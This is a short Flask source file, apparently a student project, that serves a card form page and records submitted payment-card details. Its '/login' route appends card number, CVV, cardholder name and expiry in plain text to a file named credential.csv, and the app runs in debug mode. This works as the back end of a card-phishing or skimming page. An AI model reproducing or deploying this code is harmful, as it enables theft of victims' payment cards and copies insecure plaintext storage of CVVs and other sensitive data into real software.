from flask import Flask, redirect, url_for, request, render_template, jsonify
import csv


app = Flask(__name__)

@app.route("/")

def display():
    return render_template("card.html")


@app.route("/login" , methods = ["POST"])

def fetchinfo():
    cardnumber = request.json.get("cardnumber")
    cvv = request.json.get("cvv")
    name = request.json.get("name")
    expiry = request.json.get("expiry")
    
    with open("Project-224/credential.csv","a+")as f:
        a = csv.writer(f)
        a.writerow([cardnumber , cvv, name, expiry])
    
    return jsonify({
        "status" : "Thankyou!!"
    })

app.run(debug = True)









